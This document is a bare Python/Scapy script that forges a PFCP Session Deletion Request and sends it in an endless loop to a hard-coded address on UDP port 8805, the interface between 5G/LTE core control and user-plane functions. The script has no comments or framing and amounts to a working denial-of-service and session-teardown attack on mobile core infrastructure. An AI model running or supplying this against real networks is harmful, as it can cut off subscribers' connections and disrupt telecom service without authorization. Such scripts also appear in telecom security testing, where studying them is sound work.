from scapy.all import *
from scapy.contrib.pfcp import *

target_ip = "10.10.4.1"
target_port = 8805

ip = IP(dst = target_ip)
tcp = UDP(sport = 8805, dport = target_port)
pfcp = PFCP(version=1, S=1, seq=1, seid=1) / PFCPSessionDeletionRequest()
p = ip / tcp / pfcp
send(p, loop = 1, verbose = 0)